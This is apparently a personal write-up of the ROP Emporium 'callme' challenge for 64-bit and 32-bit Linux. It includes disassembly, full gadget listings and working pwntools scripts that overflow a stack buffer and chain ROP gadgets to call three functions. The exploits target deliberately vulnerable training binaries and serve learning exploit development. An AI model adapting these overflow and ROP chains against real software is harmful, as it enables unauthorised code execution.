## callme 

Let's run `file` 

```bash 
$ file callme 
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
```

Nothing special... 

There's a shared object file as well.

```bash 1
$ file libcallme.so 
libcallme.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=be0ff85ee2d8ff280e7bc612bb2a2709737e8881, not stripped
```

In addition, some weird files were given. Not sure what the purpose is. 

```bash 
$ file encrypted_flag.dat 
encrypted_flag.dat: Non-ISO extended-ASCII text, with no line terminators
```

```bash
$ file key1.dat 
key1.dat: data

file key2.dat 
key2.dat: data
```

Another important program is [ldd](https://en.wikipedia.org/wiki/Ldd_(Unix)).

It lists dependencies the `ELF` file needs to execute.

```bash 
$ ldd callme 
	linux-vdso.so.1 (0x000078ca7df72000)
	libcallme.so => ./libcallme.so (0x000078ca7dc00000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x000078ca7d800000)
	/lib64/ld-linux-x86-64.so.2 (0x000078ca7df74000)
```

You can see that in order to run the binary it depends on the [glibc](https://en.wikipedia.org/wiki/Glibc).

Although glibc is [C code with a bit of assembly](https://elixir.bootlin.com/glibc/glibc-2.43/source), building glibc creates a shared object `/lib/x86_64-linux-gnu/libc.so.6`. 

The [dynamic linker / loader](https://unix.stackexchange.com/questions/400621/what-is-lib64-ld-linux-x86-64-so-2-and-why-can-it-be-used-to-execute-file) is `/lib64/ld-linux-x86-64.so.2`.

I knew dynamically linked binaries depended on libc and the dynamic linker/ loader but it looks like it needs the `linux-vdso.so.1` vDSO (virtual dynamic shared object) as well.

The wikipedia page for [vDSO](https://en.wikipedia.org/wiki/VDSO) and [stackoverflow](https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall) seems like a nice intro on what vDSO is. 


The goal is to call three functions. 

```c
callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
```

Let's disassemble the binary in `ghidra`.

Here's the `main` function.

```c
undefined8 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("callme by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

The `pwnme` function. 

```c
void pwnme(void)
{
  undefined1 local_28 [32];
  
  memset(local_28,0,0x20);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,local_28,0x200);
  puts("Thank you!");
  return;
}
```

Here's the `usefulFunction`.

```c
void usefulFunction(void)
{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
                      /* WARNING: Subroutine does not return */
  exit(1);
}
```

Run `ROPgadget` to check the gadgets we can use to call the `callme` functions.

Since we need to set up `3` arguments, we'll need to find a `pop rdi, rsi, rdx, ret ` instruction.

```
$ ROPgadget --binary callme 
Gadgets information
============================================================
0x00000000004007be : adc byte ptr [rax], ah ; jmp rax
0x0000000000400732 : adc cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 6 ; jmp 0x4006c0
0x0000000000400789 : add ah, dh ; nop dword ptr [rax + rax] ; repz ret
0x0000000000400717 : add al, 0 ; add byte ptr [rax], al ; jmp 0x4006c0
0x00000000004006f7 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4006c0
0x000000000040078f : add bl, dh ; ret
0x00000000004009ad : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004009ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006d7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4006c0
0x0000000000400892 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040083c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x00000000004009ac : add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
0x000000000040083d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x0000000000400a3d : add byte ptr [rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x00000000004006d9 : add byte ptr [rax], al ; jmp 0x4006c0
0x00000000004007c6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040083e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x000000000040078e : add byte ptr [rax], al ; repz ret
0x00000000004007c5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x000000000040078d : add byte ptr [rax], r8b ; repz ret
0x000000000040083f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x0000000000400a3f : add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x0000000000400827 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400a3c : add byte ptr fs:[rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x0000000000400752 : add cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 8 ; jmp 0x4006c0
0x00000000004006e7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4006c0
0x0000000000400828 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
0x0000000000400707 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4006c0
0x00000000004006bb : add esp, 8 ; ret
0x00000000004006ba : add rsp, 8 ; ret
0x0000000000400788 : and byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; repz ret
0x00000000004006d4 : and byte ptr [rax], al ; push 0 ; jmp 0x4006c0
0x00000000004006e4 : and byte ptr [rax], al ; push 1 ; jmp 0x4006c0
0x00000000004006f4 : and byte ptr [rax], al ; push 2 ; jmp 0x4006c0
0x0000000000400704 : and byte ptr [rax], al ; push 3 ; jmp 0x4006c0
0x0000000000400714 : and byte ptr [rax], al ; push 4 ; jmp 0x4006c0
0x0000000000400724 : and byte ptr [rax], al ; push 5 ; jmp 0x4006c0
0x0000000000400734 : and byte ptr [rax], al ; push 6 ; jmp 0x4006c0
0x0000000000400744 : and byte ptr [rax], al ; push 7 ; jmp 0x4006c0
0x0000000000400754 : and byte ptr [rax], al ; push 8 ; jmp 0x4006c0
0x00000000004006b1 : and byte ptr [rax], al ; test rax, rax ; je 0x4006ba ; call rax
0x0000000000400712 : and cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 4 ; jmp 0x4006c0
0x0000000000400a43 : call qword ptr [rax + 0x23000000]
0x00000000004008ee : call qword ptr [rax + 0x4855c3c9]
0x0000000000400afb : call qword ptr [rcx]
0x00000000004006b8 : call rax
0x00000000004006e2 : cmp cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4006c0
0x000000000040098c : fmul qword ptr [rax - 0x7d] ; ret
0x000000000040078a : hlt ; nop dword ptr [rax + rax] ; repz ret
0x0000000000400843 : in eax, 0x5d ; jmp 0x4007d0
0x00000000004006b6 : je 0x4006ba ; call rax
0x00000000004007b9 : je 0x4007c8 ; pop rbp ; mov edi, 0x601070 ; jmp rax
0x00000000004007fb : je 0x400808 ; pop rbp ; mov edi, 0x601070 ; jmp rax
0x000000000040028a : jmp 0x40021c
0x00000000004002d0 : jmp 0x4002a5
0x00000000004006db : jmp 0x4006c0
0x0000000000400845 : jmp 0x4007d0
0x0000000000400ad3 : jmp qword ptr [rax]
0x0000000000400b5b : jmp qword ptr [rbp]
0x00000000004007c1 : jmp rax
0x00000000004008f0 : leave ; ret
0x0000000000400822 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
0x0000000000400891 : mov eax, 0 ; pop rbp ; ret
0x0000000000400842 : mov ebp, esp ; pop rbp ; jmp 0x4007d0
0x00000000004007bc : mov edi, 0x601070 ; jmp rax
0x0000000000400841 : mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x00000000004008ef : nop ; leave ; ret
0x00000000004007c3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x000000000040078b : nop dword ptr [rax + rax] ; repz ret
0x0000000000400805 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400824 : or byte ptr [r8], r12b ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400825 : or byte ptr [rax], ah ; add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400757 : or byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4006c0
0x0000000000400742 : or cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 7 ; jmp 0x4006c0
0x000000000040099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009a0 : pop r14 ; pop r15 ; ret
0x00000000004009a2 : pop r15 ; ret
0x0000000000400844 : pop rbp ; jmp 0x4007d0
0x00000000004007bb : pop rbp ; mov edi, 0x601070 ; jmp rax
0x000000000040099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007c8 : pop rbp ; ret
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
0x00000000004009a3 : pop rdi ; ret
0x000000000040093e : pop rdx ; ret
0x00000000004009a1 : pop rsi ; pop r15 ; ret
0x000000000040093d : pop rsi ; pop rdx ; ret
0x000000000040099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006d6 : push 0 ; jmp 0x4006c0
0x00000000004006e6 : push 1 ; jmp 0x4006c0
0x00000000004006f6 : push 2 ; jmp 0x4006c0
0x0000000000400706 : push 3 ; jmp 0x4006c0
0x0000000000400716 : push 4 ; jmp 0x4006c0
0x0000000000400726 : push 5 ; jmp 0x4006c0
0x0000000000400736 : push 6 ; jmp 0x4006c0
0x0000000000400746 : push 7 ; jmp 0x4006c0
0x0000000000400756 : push 8 ; jmp 0x4006c0
0x0000000000400840 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4007d0
0x0000000000400790 : repz ret
0x00000000004006be : ret
0x0000000000400289 : retf 0x90eb
0x00000000004006b5 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000400722 : sbb cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 5 ; jmp 0x4006c0
0x0000000000400702 : sub cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4006c0
0x00000000004009b5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004009b4 : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004009aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
0x00000000004006b4 : test eax, eax ; je 0x4006ba ; call rax
0x00000000004006b3 : test rax, rax ; je 0x4006ba ; call rax
0x00000000004006f2 : xor cl, byte ptr [rcx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4006c0

Unique gadgets found: 111
```

Found exactly what we needed.

```
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

We can now pass the arguments respectively `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d` and call the `callme` functions. 

`ROP` allows you to set the arguments for a function by leveraging `pop` instructions.

The `ret` instruction will continue program execution. 

```python 
from pwn import *

p = process('./callme')
e = ELF('./callme')
r = ROP(e)

payload = b'A' * 40
pop_rdi_rsi_rdx_ret = r.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret']).address
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(e.symbols['callme_one'])

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(e.symbols['callme_two'])

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += p64(e.symbols['callme_three'])

p.send(payload)
p.interactive()
```

Using pwntools' ROP class will significantly reduce the amount of code. 

```python 
from pwn import *

context.arch = 'amd64'

p = process('./callme')
e = ELF('./callme')
rop = ROP(e)

args = [0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D]

rop.call(e.symbols['callme_one'], args)
rop.call(e.symbols['callme_two'], args)
rop.call(e.symbols['callme_three'], args)

payload = b'A' * 40 + rop.chain()

p.send(payload)
p.interactive()
```

## callme32 

Start off by running `file` and `checksec`.

```
$ file callme32 
callme32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ca5cba17bcd8926f0cda98986ef619c55023b6d, not stripped
```

```
$ checksec callme32
[*] '/home/hwkim301/ropemporium/callme/callme32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No
```

Load the binary to ghidra.

Here's the `main` function.

```c
undefined4 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("callme by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

Here's `pwnme`.

```c
void pwnme(void)
{
  undefined1 local_2c [40];
  
  memset(local_2c,0,0x20);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,local_2c,0x200);
  puts("Thank you!");
  return;
}
```

Let's run ROPgadget. 

```
$ ROPgadget --binary callme32 
Gadgets information
============================================================
0x080489cd : adc al, 0x41 ; ret
0x080485ea : adc al, 0x68 ; cmp al, 0xa0 ; add al, 8 ; call eax
0x080484e2 : adc al, 0xa0 ; add al, 8 ; push 0x10 ; jmp 0x80484b0
0x08048636 : adc byte ptr [eax + 0x68], dl ; cmp al, 0xa0 ; add al, 8 ; call edx
0x080484e7 : adc byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x080485f4 : adc cl, cl ; ret
0x08048668 : add al, 8 ; add ecx, ecx ; ret
0x080485ee : add al, 8 ; call eax
0x0804863b : add al, 8 ; call edx
0x080484c4 : add al, 8 ; push 0 ; jmp 0x80484b0
0x080484e4 : add al, 8 ; push 0x10 ; jmp 0x80484b0
0x080484f4 : add al, 8 ; push 0x18 ; jmp 0x80484b0
0x08048504 : add al, 8 ; push 0x20 ; jmp 0x80484b0
0x08048514 : add al, 8 ; push 0x28 ; jmp 0x80484b0
0x08048524 : add al, 8 ; push 0x30 ; jmp 0x80484b0
0x08048534 : add al, 8 ; push 0x38 ; jmp 0x80484b0
0x08048544 : add al, 8 ; push 0x40 ; jmp 0x80484b0
0x08048554 : add al, 8 ; push 0x48 ; jmp 0x80484b0
0x080484d4 : add al, 8 ; push 8 ; jmp 0x80484b0
0x080485ff : add bl, dh ; ret
0x080485fd : add byte ptr [eax], al ; add bl, dh ; ret
0x080484c7 : add byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x0804867c : add byte ptr [eax], al ; add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080485fc : add byte ptr [eax], al ; add byte ptr [eax], al ; repz ret
0x0804867d : add byte ptr [eax], al ; add byte ptr [ebp - 0x77], dl ; in eax, 0x5d ; jmp 0x8048610
0x080484a8 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804897e : add byte ptr [eax], al ; iretd
0x080484c9 : add byte ptr [eax], al ; jmp 0x80484b0
0x0804897a : add byte ptr [eax], al ; mov ah, 0 ; add byte ptr [eax], al ; iretd
0x080486e3 : add byte ptr [eax], al ; mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, [ecx - 4] ; ret
0x0804867e : add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080485fe : add byte ptr [eax], al ; repz ret
0x08048585 : add byte ptr [ebp - 0x17ff7d], cl ; call dword ptr [eax - 0x73]
0x0804867f : add byte ptr [ebp - 0x77], dl ; in eax, 0x5d ; jmp 0x8048610
0x080486e4 : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
0x08048665 : add eax, 0x804a040 ; add ecx, ecx ; ret
0x0804866a : add ecx, ecx ; ret
0x080485f2 : add esp, 0x10 ; leave ; ret
0x08048749 : add esp, 0x10 ; nop ; leave ; ret
0x080487f5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484aa : add esp, 8 ; pop ebx ; ret
0x08048522 : and al, 0xa0 ; add al, 8 ; push 0x30 ; jmp 0x80484b0
0x08048507 : and byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x080489ca : and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x08048589 : call 0x9555858d
0x08048592 : call dword ptr [eax + 0x51]
0x0804858b : call dword ptr [eax - 0x73]
0x080485f0 : call eax
0x0804863d : call edx
0x080486e7 : cld ; leave ; lea esp, [ecx - 4] ; ret
0x080486eb : cld ; ret
0x080485ec : cmp al, 0xa0 ; add al, 8 ; call eax
0x08048639 : cmp al, 0xa0 ; add al, 8 ; call edx
0x08048198 : cmp al, 0xa5 ; retf
0x08048537 : cmp byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x0804867b : daa ; add byte ptr [eax], al ; add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080485fb : daa ; add byte ptr [eax], al ; add byte ptr [eax], al ; repz ret
0x080486e6 : dec ebp ; cld ; leave ; lea esp, [ecx - 4] ; ret
0x080489c8 : dec ebp ; push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x080485a2 : hlt ; mov ebx, dword ptr [esp] ; ret
0x080485e9 : in al, dx ; adc al, 0x68 ; cmp al, 0xa0 ; add al, 8 ; call eax
0x08048635 : in al, dx ; adc byte ptr [eax + 0x68], dl ; cmp al, 0xa0 ; add al, 8 ; call edx
0x08048682 : in eax, 0x5d ; jmp 0x8048610
0x080485e7 : in eax, 0x83 ; in al, dx ; adc al, 0x68 ; cmp al, 0xa0 ; add al, 8 ; call eax
0x08048748 : inc dword ptr [ebx - 0x366fef3c] ; ret
0x08048666 : inc eax ; mov al, byte ptr [0xc9010804] ; ret
0x080489ce : inc ecx ; ret
0x080489cb : inc edi ; push cs ; adc al, 0x41 ; ret
0x08048663 : inc esi ; add eax, 0x804a040 ; add ecx, ecx ; ret
0x080481e6 : int1 ; push cs ; jmp 0x80481bd
0x08048980 : iretd
0x0804866e : jbe 0x8048670 ; repz ret
0x080487fe : jbe 0x8048800 ; repz ret
0x08048645 : je 0x804866d ; add bl, dh ; ret
0x080487f4 : jecxz 0x8048779 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080481e8 : jmp 0x80481bd
0x080484cb : jmp 0x80484b0
0x08048684 : jmp 0x8048610
0x08048937 : jmp dword ptr [edi]
0x08048963 : jmp dword ptr [edx]
0x08048791 : jmp dword ptr [esi - 0x70]
0x080487f3 : jne 0x80487d8 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080485f9 : lea edi, [edi] ; repz ret
0x08048644 : lea esi, [esi] ; repz ret
0x080486e9 : lea esp, [ecx - 4] ; ret
0x080486e8 : leave ; lea esp, [ecx - 4] ; ret
0x080485f5 : leave ; ret
0x080484ab : les ecx, ptr [eax] ; pop ebx ; ret
0x080487f6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080485f3 : les edx, ptr [eax] ; leave ; ret
0x0804874a : les edx, ptr [eax] ; nop ; leave ; ret
0x0804897c : mov ah, 0 ; add byte ptr [eax], al ; iretd
0x08048667 : mov al, byte ptr [0xc9010804] ; ret
0x080485ed : mov al, byte ptr [0xd0ff0804] ; add esp, 0x10 ; leave ; ret
0x0804863a : mov al, byte ptr [0xd2ff0804] ; add esp, 0x10 ; leave ; ret
0x08048664 : mov byte ptr [0x804a040], 1 ; leave ; ret
0x080484a6 : mov dh, 0 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048681 : mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080485a3 : mov ebx, dword ptr [esp] ; ret
0x080486e5 : mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, [ecx - 4] ; ret
0x080485fa : mov esp, 0x27 ; add bl, dh ; ret
0x08048199 : movsd dword ptr es:[edi], dword ptr [esi] ; retf
0x0804874c : nop ; leave ; ret
0x080485bf : nop ; mov ebx, dword ptr [esp] ; ret
0x080485bd : nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x080485bb : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x080485a8 : nop ; nop ; nop ; nop ; nop ; repz ret
0x080485aa : nop ; nop ; nop ; nop ; repz ret
0x080485ac : nop ; nop ; nop ; repz ret
0x080485ae : nop ; nop ; repz ret
0x080485af : nop ; repz ret
0x080487f7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080484c2 : or al, 0xa0 ; add al, 8 ; push 0 ; jmp 0x80484b0
0x080484d7 : or byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x08048669 : or byte ptr [ecx], al ; leave ; ret
0x08048590 : out 0xff, eax ; call dword ptr [eax + 0x51]
0x08048683 : pop ebp ; jmp 0x8048610
0x080487fb : pop ebp ; ret
0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484ad : pop ebx ; ret
0x080487fa : pop edi ; pop ebp ; ret
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
0x08048810 : pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080486ea : popal ; cld ; ret
0x080484c6 : push 0 ; jmp 0x80484b0
0x080484e6 : push 0x10 ; jmp 0x80484b0
0x080484f6 : push 0x18 ; jmp 0x80484b0
0x08048506 : push 0x20 ; jmp 0x80484b0
0x08048516 : push 0x28 ; jmp 0x80484b0
0x08048526 : push 0x30 ; jmp 0x80484b0
0x08048536 : push 0x38 ; jmp 0x80484b0
0x08048546 : push 0x40 ; jmp 0x80484b0
0x08048556 : push 0x48 ; jmp 0x80484b0
0x080485eb : push 0x804a03c ; call eax
0x08048638 : push 0x804a03c ; call edx
0x080484d6 : push 8 ; jmp 0x80484b0
0x080489cc : push cs ; adc al, 0x41 ; ret
0x080489c9 : push cs ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x080481e7 : push cs ; jmp 0x80481bd
0x080489c6 : push cs ; xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret
0x08048637 : push eax ; push 0x804a03c ; call edx
0x08048680 : push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
0x080485a1 : push esp ; mov ebx, dword ptr [esp] ; ret
0x080485b0 : repz ret
0x08048496 : ret
0x0804861e : ret 0xeac1
0x0804819a : retf
0x080485a4 : sbb al, 0x24 ; ret
0x08048502 : sbb al, 0xa0 ; add al, 8 ; push 0x20 ; jmp 0x80484b0
0x08048583 : sbb al, byte ptr [eax] ; add byte ptr [ebp - 0x17ff7d], cl ; call dword ptr [eax - 0x73]
0x080484f7 : sbb byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x08048978 : sbb byte ptr [eax], al ; add byte ptr [eax], al ; mov ah, 0 ; add byte ptr [eax], al ; iretd
0x08048582 : sbb byte ptr [edx], 0 ; add byte ptr [ebp - 0x17ff7d], cl ; call dword ptr [eax - 0x73]
0x08048542 : sub al, 0xa0 ; add al, 8 ; push 0x40 ; jmp 0x80484b0
0x08048517 : sub byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x08048634 : sub esp, 0x10 ; push eax ; push 0x804a03c ; call edx
0x080485e8 : sub esp, 0x14 ; push 0x804a03c ; call eax
0x080485f8 : test byte ptr [ebp + 0x27bc], 0 ; add bl, dh ; ret
0x08048527 : xor byte ptr [eax], al ; add byte ptr [eax], al ; jmp 0x80484b0
0x080489c7 : xor byte ptr [ebp + 0xe], cl ; and byte ptr [edi + 0xe], al ; adc al, 0x41 ; ret

Unique gadgets found: 160
```

This one looks good, it's the only gadget that sets up `3` arguments at once. 

```
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
```

Unlike x86-64 where the calling convention forces you to use set up rdi, rsi, rdx for arg1, arg2 and arg3 x86 doesn't have a strict rule. 

x86-64 has a calling convention that forces to call programs in the userspace and the kernel by setting up rdi, rsi, rdx ... as arg1, arg2 and arg3. 

However, while x86 does have calling convention for syscalls, for userspace functions it doesn't.

Instead it uses cdecl, which stores arguments on the stack. 

As a result, any pop gadget will do the job as long as the instructions include the exact same number of pop + ret instructions as the arguments needed for the function call. 

A stark difference between x86-64 and x86 is that in x86 you need to call `p32` on the functions you want to call first then pass the arguments in pwntools.

It's a bit hard to explain this part coherently but I'll give it a shot. 

For x86-64, the order of the pwntools code exactly matches how function calls are executed. 

Let's go to the thought process of how rop in x86-64 works. 

First, the pop rdi + ret gadgets get executed and you pass the value needed for arg1.

Now rdi holds arg1 and the stack pointer increases by 8. 

Then the function gets called with the call instruction. 

Perfectly matches the order of the pwntools payload.

On the other hand, in x86 the pwntools code starts of by calling the function. 

This is because the arguments or saved on the stack and not on the register.

In order to set up gadgets the previous instruction must end in a ret to continue program execution. 

Luckily for x86-64, gadgets like pop rdi ret do just that. 

Since x86 doesn't use registers to pass arguments starting the program with a pop e*i + ret gadget isn't useful.

Nonetheless it still needs a ret gadget to pop the arguments of the stack to set up the arguments for the function call.

If we can use execute the ret instruction from the previous function first then execute the pop gadgets to increase the stack pointer (so it points to the higher addresses), this will allow the esp to point to the arguments from arg1, arg2, ... etc.

Then how does the program know that it's finished popping off arguments from the stack and calling the function? 

Well, recall the fact that all the ropgadgets end in a ret instruction. 

After executing all the pop gadgets it will finish off with a ret instruction.

This will continue the program execution. 

Here's the pwntools code. 

```python
from pwn import *

p = process('./callme32')
e = ELF('./callme32')
r = ROP(e)

payload = b'A' * 44
pop_esi_edi_ebp = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret']).address

payload += p32(e.symbols['callme_one'])
payload += p32(pop_esi_edi_ebp)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)

payload += p32(e.symbols['callme_two'])
payload += p32(pop_esi_edi_ebp)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)


payload += p32(e.symbols['callme_three'])
payload += p32(pop_esi_edi_ebp)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)

p.send(payload)
p.interactive()
```

This one's a simplified version.

```python 
from pwn import *

p = process('./callme32')
e = ELF('./callme32')
r = ROP(e)

args = [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D]

payload = b'A' * 44

r.call(e.symbols['callme_one'], args)
r.call(e.symbols['callme_two'], args)
r.call(e.symbols['callme_three'], args)

payload += r.chain()

p.send(payload)
p.interactive()
```